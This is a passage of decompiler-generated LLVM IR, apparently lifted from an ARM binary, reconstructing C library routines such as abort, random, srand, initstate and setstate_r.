  %v4_139a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 32) to i32*), align 4
  store i32 %v4_139a8, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_139a8, i32* @r0, align 4
  %v0_139b8 = call i32 @__malloc_consolidate()
  %v0_139bc = load i32, i32* @r4, align 4
  %v0_139c0 = load i32, i32* @r5, align 4
  %v2_139c8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_139c8, i32* @r4, align 4
  store i32 %v6_13998, i32* @r5, align 4
  %v2_139cc = call i32 @__malloc_trim(i32 %v0_139bc, i32 %v0_139c0)
  %v0_139d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_139d0, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_139d4 = phi i32 [ %v2_139cc, %entry ], [ 0, %bb ]
  ret i32 %v4_139d4

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 32) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r5, align 4
  %v4_139f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 16) to i32*), align 4
  store i32 80380, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_139f0)
  %v2_13a0c = ptrtoint i32* %stack_var_-8 to i32
  store i32 32, i32* %stack_var_-8, align 4
  %v6_13a18 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_13a0c, i32 0, i32 32)
  %v0_13a20 = load i32, i32* @r5, align 4
  %v2_13a20 = add i32 %v0_13a20, 27576
  %v3_13a20 = inttoptr i32 %v2_13a20 to i32*
  %v4_13a20 = load i32, i32* %v3_13a20, align 4
  %v2_13a24 = icmp eq i32 %v4_13a20, 0
  br i1 %v2_13a24, label %dec_label_pc_13a2c, label %dec_label_pc_13a6c

dec_label_pc_13a2c:                               ; preds = %entry
  store i32 1, i32* %v3_13a20, align 4
  br label %dec_label_pc_13a34

dec_label_pc_13a34:                               ; preds = %dec_label_pc_13a7c, %dec_label_pc_13a2c
  %v0_13a38 = load i32, i32* @r5, align 4
  %v2_13a38 = add i32 %v0_13a38, 2180
  store i32 %v2_13a38, i32* @r4, align 4
  %v2_13a44 = add i32 %v0_13a38, 36
  %v3_13a44 = inttoptr i32 %v2_13a44 to i32*
  %v4_13a44 = load i32, i32* %v3_13a44, align 4
  call void @__pseudo_branch(i32 %v4_13a44)
  %v1_13a54 = call i32 @__GI_raise(i32 6)
  %v0_13a60 = load i32, i32* @r5, align 4
  %v2_13a60 = add i32 %v0_13a60, 16
  %v3_13a60 = inttoptr i32 %v2_13a60 to i32*
  %v4_13a60 = load i32, i32* %v3_13a60, align 4
  store i32 80492, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13a60)
  %v0_13a70.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13a6c

dec_label_pc_13a6c:                               ; preds = %entry, %dec_label_pc_13a34
  %v1_13a84 = phi i32 [ %v0_13a20, %entry ], [ %v0_13a70.pre, %dec_label_pc_13a34 ]
  %v2_13a70 = add i32 %v1_13a84, 27576
  %v3_13a70 = inttoptr i32 %v2_13a70 to i32*
  %v4_13a70 = load i32, i32* %v3_13a70, align 4
  %v7_13a74 = icmp eq i32 %v4_13a70, 1
  br i1 %v7_13a74, label %dec_label_pc_13a7c, label %dec_label_pc_13ab8

dec_label_pc_13a7c:                               ; preds = %dec_label_pc_13a6c
  %v2_13a7c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_13a7c, i32* @r4, align 4
  store i32 2, i32* %v3_13a70, align 4
  store i32 20, i32* @r2, align 4
  %v2_13a94 = bitcast i32* %stack_var_-28 to i8*
  %v3_13a94 = call i32 @__GI_memset(i8* %v2_13a94, i32 0)
  %v3_13ab0 = call i32 @__libc_sigaction(i32 6, i32 %v2_13a7c, i32 0)
  br label %dec_label_pc_13a34

dec_label_pc_13ab8:                               ; preds = %dec_label_pc_13a6c
  %v7_13ab8 = icmp eq i32 %v4_13a70, 2
  br i1 %v7_13ab8, label %dec_label_pc_13ac0, label %dec_label_pc_13acc

dec_label_pc_13ac0:                               ; preds = %dec_label_pc_13ab8
  store i32 3, i32* %v3_13a70, align 4
  %v0_13ac8 = call i32 @abort()
  %v0_13acc.pre = load i32, i32* @r5, align 4
  %v1_13acc.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_13acc

dec_label_pc_13acc:                               ; preds = %dec_label_pc_13ab8, %dec_label_pc_13ac0
  %v3_13ad8 = phi i32 [ 27576, %dec_label_pc_13ab8 ], [ %v1_13acc.pre, %dec_label_pc_13ac0 ]
  %v2_13ad8 = phi i32 [ %v1_13a84, %dec_label_pc_13ab8 ], [ %v0_13acc.pre, %dec_label_pc_13ac0 ]
  %v2_13acc = add i32 %v2_13ad8, %v3_13ad8
  %v3_13acc = inttoptr i32 %v2_13acc to i32*
  %v4_13acc = load i32, i32* %v3_13acc, align 4
  %v7_13ad0 = icmp eq i32 %v4_13acc, 3
  br i1 %v7_13ad0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13acc
  store i32 4, i32* %v3_13acc, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13acc, %bb
  call void @__pseudo_cond_branch(i1 %v7_13ad0, i32 ptrtoint (i32* @global_var_fb00.752 to i32))
  br label %dec_label_pc_13ae4

dec_label_pc_13ae4:                               ; preds = %dec_label_pc_13ae4, %.thread2
  %v0_13ae4 = call i32 @abort()
  br label %dec_label_pc_13ae4

; uselistorder directives
  uselistorder i32* %v3_13a70, { 1, 0, 2 }
  uselistorder i32 ()* @abort, { 2, 1, 5, 4, 6, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_sigprocmask, { 0, 2, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_13acc, { 1, 0 }
  uselistorder label %dec_label_pc_13a6c, { 1, 0 }
}

define i32 @function_13af0(i16* %arg1) local_unnamed_addr {
dec_label_pc_13af0:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_13af0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13af0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13af0
  %v2_13af0 = load i32, i32* @r4, align 4
  %v5_13af0 = mul i32 %v2_13af0, 131072
  %v6_13af0 = and i32 %v5_13af0, %tmp
  %v1_13af8 = load i32, i32* @r6, align 4
  %v2_13af8 = trunc i32 %v1_13af8 to i16
  %v4_13af8 = inttoptr i32 %v6_13af0 to i16*
  store i16 %v2_13af8, i16* %v4_13af8, align 131072
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13af0, %bb
  %v4_13afc = phi i32 [ %tmp, %dec_label_pc_13af0 ], [ 0, %bb ]
  ret i32 %v4_13afc

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_13b08 = call i32 @random()
  ret i32 %v0_13b08
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_13b18 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r4, align 4
  %v4_13b48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13b48)
  %v0_13b5c = load i32, i32* @r4, align 4
  %v2_13b5c = add i32 %v0_13b5c, 16
  %v3_13b5c = inttoptr i32 %v2_13b5c to i32*
  %v4_13b5c = load i32, i32* %v3_13b5c, align 4
  store i32 ptrtoint (i32* @global_var_13b68.759 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13b5c)
  %v2_13b6c = ptrtoint i32* %stack_var_-20 to i32
  %v0_13b70 = load i32, i32* @r4, align 4
  %v2_13b70 = add i32 %v0_13b70, 2356
  %v2_13b74 = inttoptr i32 %v2_13b70 to i32*
  %v3_13b74 = call i32 @__GI_random_r(i32* %v2_13b74, i32 %v2_13b6c)
  %v0_13b84 = load i32, i32* @r4, align 4
  %v2_13b84 = add i32 %v0_13b84, 24
  %v3_13b84 = inttoptr i32 %v2_13b84 to i32*
  %v4_13b84 = load i32, i32* %v3_13b84, align 4
  call void @__pseudo_branch(i32 %v4_13b84)
  %v3_13b90 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_13b18, i32* @r4, align 4
  ret i32 %v3_13b90
}

define i32 @function_13ba4() local_unnamed_addr {
dec_label_pc_13ba4:
  %v0_13ba4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13ba4, label %bb, label %dec_label_pc_13ba4..thread4_crit_edge

dec_label_pc_13ba4..thread4_crit_edge:            ; preds = %dec_label_pc_13ba4
  %v10_13bb8.pre = load i32, i32* @r0, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_13ba4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13ba4..thread4_crit_edge, %bb
  %v10_13bb8 = phi i32 [ %v10_13bb8.pre, %dec_label_pc_13ba4..thread4_crit_edge ], [ 0, %bb ]
  ret i32 %v10_13bb8

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  %v4_13bec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13bec)
  %v0_13c00 = load i32, i32* @r6, align 4
  %v2_13c00 = add i32 %v0_13c00, 16
  %v3_13c00 = inttoptr i32 %v2_13c00 to i32*
  %v4_13c00 = load i32, i32* %v3_13c00, align 4
  call void @__pseudo_branch(i32 %v4_13c00)
  %v0_13c10 = load i32, i32* @r6, align 4
  %v2_13c10 = add i32 %v0_13c10, 2356
  %v0_13c18 = load i32, i32* @r5, align 4
  %v1_13c1c = add i32 %v0_13c10, 2364
  %v2_13c1c = inttoptr i32 %v1_13c1c to i32*
  %v3_13c1c = load i32, i32* %v2_13c1c, align 4
  store i32 %v3_13c1c, i32* @r4, align 4
  %v2_13c20 = inttoptr i32 %v2_13c10 to i32*
  %v3_13c20 = call i32 @setstate_r(i32 %v0_13c18, i32* %v2_13c20)
  %v1_13c28 = icmp slt i32 %v3_13c20, 0
  %v3_13c38 = load i32, i32* @r4, align 4
  %v4_13c38 = add i32 %v3_13c38, -4
  %storemerge = select i1 %v1_13c28, i32 0, i32 %v4_13c38
  %v0_13c3c = load i32, i32* @r6, align 4
  %v2_13c3c = add i32 %v0_13c3c, 24
  %v3_13c3c = inttoptr i32 %v2_13c3c to i32*
  %v4_13c3c = load i32, i32* %v3_13c3c, align 4
  call void @__pseudo_branch(i32 %v4_13c3c)
  ret i32 %storemerge
}

define i32 @function_13c5c() local_unnamed_addr {
dec_label_pc_13c5c:
  %v0_13c5c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13c5c, label %bb, label %dec_label_pc_13c5c..thread4_crit_edge

dec_label_pc_13c5c..thread4_crit_edge:            ; preds = %dec_label_pc_13c5c
  %v10_13c70.pre = load i32, i32* @r0, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_13c5c
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13c5c..thread4_crit_edge, %bb
  %v10_13c70 = phi i32 [ %v10_13c70.pre, %dec_label_pc_13c5c..thread4_crit_edge ], [ 0, %bb ]
  ret i32 %v10_13c70

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v4_13cac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13cac)
  %v0_13cc0 = load i32, i32* @r4, align 4
  %v2_13cc0 = add i32 %v0_13cc0, 16
  %v3_13cc0 = inttoptr i32 %v2_13cc0 to i32*
  %v4_13cc0 = load i32, i32* %v3_13cc0, align 4
  call void @__pseudo_branch(i32 %v4_13cc0)
  %v0_13cd0 = load i32, i32* @r6, align 4
  %v0_13cd4 = load i32, i32* @r4, align 4
  %v2_13cd4 = add i32 %v0_13cd4, 2356
  %v0_13cd8 = load i32, i32* @r7, align 4
  %v0_13cdc = load i32, i32* @sl, align 4
  store i32 %v0_13cdc, i32* @r0, align 4
  %v1_13ce0 = add i32 %v0_13cd4, 2364
  %v2_13ce0 = inttoptr i32 %v1_13ce0 to i32*
  %v3_13ce0 = load i32, i32* %v2_13ce0, align 4
  store i32 %v3_13ce0, i32* @r5, align 4
  %v4_13ce4 = inttoptr i32 %v0_13cdc to i32*
  %v5_13ce4 = call i32 @__GI_initstate_r(i32* %v4_13ce4, i32 %v0_13cd0, i32 %v0_13cd8, i32 %v2_13cd4)
  %v0_13cf4 = load i32, i32* @r4, align 4
  %v2_13cf4 = add i32 %v0_13cf4, 24
  %v3_13cf4 = inttoptr i32 %v2_13cf4 to i32*
  %v4_13cf4 = load i32, i32* %v3_13cf4, align 4
  call void @__pseudo_branch(i32 %v4_13cf4)
  %v0_13d00 = load i32, i32* @r5, align 4
  %v1_13d00 = add i32 %v0_13d00, -4
  ret i32 %v1_13d00
}

define i32 @function_13d1c() local_unnamed_addr {
dec_label_pc_13d1c:
  %v0_13d1c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13d1c, label %bb, label %dec_label_pc_13d1c..thread4_crit_edge

dec_label_pc_13d1c..thread4_crit_edge:            ; preds = %dec_label_pc_13d1c
  %v10_13d30.pre = load i32, i32* @r0, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_13d1c
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13d1c..thread4_crit_edge, %bb
  %v10_13d30 = phi i32 [ %v10_13d30.pre, %dec_label_pc_13d1c..thread4_crit_edge ], [ 0, %bb ]
  ret i32 %v10_13d30

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v3_13d34 = load i32, i32* @r4, align 4
  %v6_13d34 = load i32, i32* @r5, align 4
  %v9_13d34 = load i32, i32* @r6, align 4
  %v15_13d34 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r4, align 4
  %v2_13d48 = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 2204), i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_13d64 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13d64)
  %v0_13d78 = load i32, i32* @r4, align 4
  %v2_13d78 = add i32 %v0_13d78, 16
  %v3_13d78 = inttoptr i32 %v2_13d78 to i32*
  %v4_13d78 = load i32, i32* %v3_13d78, align 4
  call void @__pseudo_branch(i32 %v4_13d78)
  %v0_13d88 = load i32, i32* @r6, align 4
  store i32 %v0_13d88, i32* @r0, align 4
  %v0_13d8c = load i32, i32* @r4, align 4
  %v2_13d8c = add i32 %v0_13d8c, 2356
  %v2_13d90 = inttoptr i32 %v0_13d88 to i32*
  %v3_13d90 = call i32 @srandom_r(i32* %v2_13d90, i32 %v2_13d8c)
  %v0_13da4 = load i32, i32* @r4, align 4
  %v2_13da4 = add i32 %v0_13da4, 24
  %v3_13da4 = inttoptr i32 %v2_13da4 to i32*
  %v4_13da4 = load i32, i32* %v3_13da4, align 4
  call void @__pseudo_branch(i32 %v4_13da4)
  store i32 %v3_13d34, i32* @r4, align 4
  store i32 %v6_13d34, i32* @r5, align 4
  store i32 %v9_13d34, i32* @r6, align 4
  store i32 %v15_13d34, i32* @lr, align 4
  ret i32 %v2_13d48
}

define i32 @function_13dc0() local_unnamed_addr {
dec_label_pc_13dc0:
  %v0_13dc0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13dc0, label %bb, label %dec_label_pc_13dc0..thread4_crit_edge

dec_label_pc_13dc0..thread4_crit_edge:            ; preds = %dec_label_pc_13dc0
  %v10_13dd4.pre = load i32, i32* @r0, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_13dc0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13dc0..thread4_crit_edge, %bb
  %v10_13dd4 = phi i32 [ %v10_13dd4.pre, %dec_label_pc_13dc0..thread4_crit_edge ], [ 0, %bb ]
  ret i32 %v10_13dd4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13dd8 = load i32, i32* @r4, align 4
  store i32 %v3_13dd8, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v1_13de0 = add i32 %tmp, 12
  %v2_13de0 = inttoptr i32 %v1_13de0 to i8*
  %v3_13de0 = load i8, i8* %v2_13de0, align 1
  %v4_13de0 = zext i8 %v3_13de0 to i32
  store i32 %v4_13de0, i32* %r1.global-to-local, align 4
  %v2_13de4 = icmp eq i8 %v3_13de0, 0
  store i1 %v2_13de4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13de4, label %.thread5, label %.thread6

.thread5:                                         ; preds = %entry
  %v1_13dec12 = add i32 %arg1, 4
  store i32 %v1_13dec12, i32* %r6.global-to-local, align 4
  %v1_13df013 = add i32 %tmp, 8
  %v2_13df014 = inttoptr i32 %v1_13df013 to i32*
  %v3_13df015 = load i32, i32* %v2_13df014, align 4
  store i32 %v3_13df015, i32* %r0.global-to-local, align 4
  %v3_13e0c = add i32 %v3_13df015, -4
  %v4_13e0c = inttoptr i32 %v3_13e0c to i32*
  store i32 %v4_13de0, i32* %v4_13e0c, align 4
  br label %bb

.thread6:                                         ; preds = %entry
  %v2_13de8 = add i32 %tmp, 4
  %v3_13de8 = inttoptr i32 %v2_13de8 to i32*
  %v4_13de8 = load i32, i32* %v3_13de8, align 4
  %v1_13dec = add i32 %arg1, 4
  store i32 %v1_13dec, i32* %r6.global-to-local, align 4
  %v1_13df0 = add i32 %tmp, 8
  %v2_13df0 = inttoptr i32 %v1_13df0 to i32*
  %v3_13df0 = load i32, i32* %v2_13df0, align 4
  store i32 %v3_13df0, i32* %r0.global-to-local, align 4
  %v3_13df8 = sub i32 %v4_13de8, %v3_13df0
  %v4_13dfc = sdiv i32 %v3_13df8, 4
  %v4_13e00 = sext i8 %v3_13de0 to i32
  store i32 %v4_13e00, i32* %r1.global-to-local, align 4
  %v4_13e08 = mul i32 %v4_13dfc, 5
  %v5_13e08 = add i32 %v4_13e08, %v4_13e00
  %v3_13e10 = add i32 %v3_13df0, -4
  %v4_13e10 = inttoptr i32 %v3_13e10 to i32*
  store i32 %v5_13e08, i32* %v4_13e10, align 4
  br label %bb

bb:                                               ; preds = %.thread5, %.thread6
  %v0_13e18 = load i32, i32* %r6.global-to-local, align 4
  %v1_13e18 = add i32 %v0_13e18, -4
  %v2_13e18 = inttoptr i32 %v1_13e18 to i32*
  %v3_13e18 = load i32, i32* %v2_13e18, align 4
  %v2_13e20 = udiv i32 %v3_13e18, 5
  %v3_13e20 = urem i32 %v3_13e18, 5
  store i32 %v2_13e20, i32* %r0.global-to-local, align 4
  store i32 %v3_13e20, i32* %r1.global-to-local, align 4
  %v2_13e28 = icmp ugt i32 %v3_13e20, 3
  %v7_13e28 = icmp eq i32 %v3_13e20, 4
  store i1 %v7_13e28, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r5.global-to-local, align 4
  %v2_13e30 = xor i1 %v7_13e28, true
  %v3_13e30 = and i1 %v2_13e28, %v2_13e30
  br i1 %v3_13e30, label %dec_label_pc_13e98, label %dec_label_pc_13e34

dec_label_pc_13e34:                               ; preds = %bb
  %v4_13e3c = mul nuw nsw i32 %v3_13e20, 4
  %v5_13e3c = add i32 %v4_13e3c, add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33968)
  %v1_13e40 = add i32 %v4_13e3c, add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33948)
  %v2_13e40 = inttoptr i32 %v1_13e40 to i32*
  %v3_13e40 = load i32, i32* %v2_13e40, align 4
  store i32 %v3_13e40, i32* %r5.global-to-local, align 4
  %v6_13e44 = inttoptr i32 %v5_13e3c to i32*
  %v7_13e44 = load i32, i32* %v6_13e44, align 4
  store i32 %v7_13e44, i32* %r7.global-to-local, align 4
  %v2_13e48 = icmp eq i32 %v3_13e20, 0
  store i1 %v2_13e48, i1* %cpsr_z.global-to-local, align 1
  %v1_13e4c = trunc i32 %v3_13e40 to i8
  %v2_13e4c = load i32, i32* %r4.global-to-local, align 4
  %v3_13e4c = add i32 %v2_13e4c, 13
  %v4_13e4c = inttoptr i32 %v3_13e4c to i8*
  store i8 %v1_13e4c, i8* %v4_13e4c, align 1
  %v0_13e50 = load i32, i32* %r7.global-to-local, align 4
  %v1_13e50 = trunc i32 %v0_13e50 to i8
  %v2_13e50 = load i32, i32* %r4.global-to-local, align 4
  %v3_13e50 = add i32 %v2_13e50, 14
  %v4_13e50 = inttoptr i32 %v3_13e50 to i8*
  store i8 %v1_13e50, i8* %v4_13e50, align 1
  %v0_13e54 = load i32, i32* %r1.global-to-local, align 4
  %v1_13e54 = trunc i32 %v0_13e54 to i8
  %v2_13e54 = load i32, i32* %r4.global-to-local, align 4
  %v3_13e54 = add i32 %v2_13e54, 12
  %v4_13e54 = inttoptr i32 %v3_13e54 to i8*
  store i8 %v1_13e54, i8* %v4_13e54, align 1
  %v0_13e58 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13e58, label %dec_label_pc_13e84, label %dec_label_pc_13e5c

dec_label_pc_13e5c:                               ; preds = %dec_label_pc_13e34
  store i32 5, i32* %r1.global-to-local, align 4
  %v0_13e60 = load i32, i32* %r6.global-to-local, align 4
  %v1_13e60 = add i32 %v0_13e60, -4
  %v2_13e60 = inttoptr i32 %v1_13e60 to i32*
  %v3_13e60 = load i32, i32* %v2_13e60, align 4
  %v2_13e64 = sdiv i32 %v3_13e60, 5
  store i32 %v2_13e64, i32* %r0.global-to-local, align 4
  %v4_13e68 = mul i32 %v2_13e64, 4
  %v5_13e68 = add i32 %v4_13e68, %v0_13e60
  %v1_13e6c = load i32, i32* %r4.global-to-local, align 4
  %v2_13e6c = add i32 %v1_13e6c, 4
  %v3_13e6c = inttoptr i32 %v2_13e6c to i32*
  store i32 %v5_13e68, i32* %v3_13e6c, align 4
  %v0_13e70 = load i32, i32* %r7.global-to-local, align 4
  %v1_13e70 = load i32, i32* %r0.global-to-local, align 4
  %v2_13e70 = add i32 %v1_13e70, %v0_13e70
  %v0_13e74 = load i32, i32* %r5.global-to-local, align 4
  %v2_13e78 = udiv i32 %v2_13e70, %v0_13e74
  %v3_13e78 = urem i32 %v2_13e70, %v0_13e74
  store i32 %v2_13e78, i32* %r0.global-to-local, align 4
  %v0_13e7c = load i32, i32* %r6.global-to-local, align 4
  %v4_13e7c = mul i32 %v3_13e78, 4
  %v5_13e7c = add i32 %v0_13e7c, %v4_13e7c
  store i32 %v5_13e7c, i32* %r1.global-to-local, align 4
  %v1_13e80 = load i32, i32* %r4.global-to-local, align 4
  %v2_13e80 = inttoptr i32 %v1_13e80 to i32*
  store i32 %v5_13e7c, i32* %v2_13e80, align 4
  br label %dec_label_pc_13e84

dec_label_pc_13e84:                               ; preds = %dec_label_pc_13e34, %dec_label_pc_13e5c
  %v0_13e84 = load i32, i32* %r6.global-to-local, align 4
  %v1_13e84 = load i32, i32* %r5.global-to-local, align 4
  %v4_13e84 = mul i32 %v1_13e84, 4
  %v5_13e84 = add i32 %v4_13e84, %v0_13e84
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13e8c = load i32, i32* %r4.global-to-local, align 4
  %v2_13e8c = add i32 %v1_13e8c, 16
  %v3_13e8c = inttoptr i32 %v2_13e8c to i32*
  store i32 %v5_13e84, i32* %v3_13e8c, align 4
  %v0_13e90 = load i32, i32* %r6.global-to-local, align 4
  %v1_13e90 = load i32, i32* %r4.global-to-local, align 4
  %v2_13e90 = add i32 %v1_13e90, 8
  %v3_13e90 = inttoptr i32 %v2_13e90 to i32*
  store i32 %v0_13e90, i32* %v3_13e90, align 4
  %v1_13eb0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13ea8

dec_label_pc_13e98:                               ; preds = %bb
  %v0_13e98 = call i32 @__GI___errno_location()
  %v2_13ea0 = inttoptr i32 %v0_13e98 to i32*
  store i32 22, i32* %v2_13ea0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13ea8

dec_label_pc_13ea8:                               ; preds = %dec_label_pc_13e84, %dec_label_pc_13e98
  %v1_13eb0 = phi i32 [ %v1_13eb0.pre, %dec_label_pc_13e84 ], [ -1, %dec_label_pc_13e98 ]
  %v2_13eac = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13eac, i32* @r4, align 4
  ret i32 %v1_13eb0

; uselistorder directives
  uselistorder i32 %v0_13e74, { 1, 0 }
  uselistorder i32 %v2_13e70, { 1, 0 }
  uselistorder i32 %v3_13e18, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 1, 2, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 1, 2, 3, 4, 8, 9, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13ea8, { 1, 0 }
  uselistorder label %dec_label_pc_13e84, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13ebc = load i32, i32* @r4, align 4
  store i32 %v3_13ebc, i32* %stack_var_-8, align 4
  %v1_13ec0 = add i32 %tmp, 12
  %v2_13ec0 = inttoptr i32 %v1_13ec0 to i8*
  %v3_13ec0 = load i8, i8* %v2_13ec0, align 1
  %v4_13ec0 = sext i8 %v3_13ec0 to i32
  store i32 %v4_13ec0, i32* %r3.global-to-local, align 4
  %v2_13ec4 = icmp eq i8 %v3_13ec0, 0
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_13ed0 = add i32 %tmp, 8
  %v2_13ed0 = inttoptr i32 %v1_13ed0 to i32*
  %v3_13ed0 = load i32, i32* %v2_13ed0, align 4
  store i32 %v3_13ed0, i32* %lr.global-to-local, align 4
  br i1 %v2_13ec4, label %dec_label_pc_13ed8, label %dec_label_pc_13efc

dec_label_pc_13ed8:                               ; preds = %entry
  %v1_13ed8 = inttoptr i32 %v3_13ed0 to i32*
  %v2_13ed8 = load i32, i32* %v1_13ed8, align 4
  store i32 %v2_13ed8, i32* %r2.global-to-local, align 4
  %v2_13ee0 = mul i32 %v2_13ed8, 1103515245
  %v1_13ee8 = add i32 %v2_13ee0, 12345
  %tmp6 = bitcast i32 %v1_13ee8 to float
  %tmp7 = call float @fabsf(float %tmp6)
  %v1_13eec = bitcast float %tmp7 to i32
  store i32 %v1_13eec, i32* %r3.global-to-local, align 4
  store i32 %v1_13eec, i32* %v1_13ed8, align 4
  %v0_13ef4 = load i32, i32* %r3.global-to-local, align 4
  %v2_13ef4 = inttoptr i32 %arg2 to i32*
